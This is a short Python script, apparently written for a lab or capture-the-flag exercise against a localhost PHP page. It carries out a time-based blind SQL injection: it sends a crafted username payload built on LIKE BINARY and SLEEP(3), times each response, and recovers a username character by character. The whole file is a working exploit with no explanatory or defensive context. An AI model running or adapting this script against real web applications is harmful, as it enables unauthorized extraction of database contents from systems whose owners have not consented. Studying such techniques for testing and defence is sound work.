import requests
import time

url = "http://localhost/SuperSecretWebpage.php"
characters = "abcdefghijklmnopqrstuvwxyz0123456789"

username = ""

flag = True

while flag == True:
    flag = False
    for c in characters:
        test_case = username + c
        data = { "username" : f"test' OR username LIKE BINARY '{test_case}%' AND SLEEP(3) AND ''='" }
        start = time.time()
        response = requests.post(url, data=data)
        stop = time.time()

        total_time = stop - start

        if (total_time > 2):
            username = username + c
            print(f"Found Characters: {username}")
            flag = True
            break

print(f"Username: {username}")



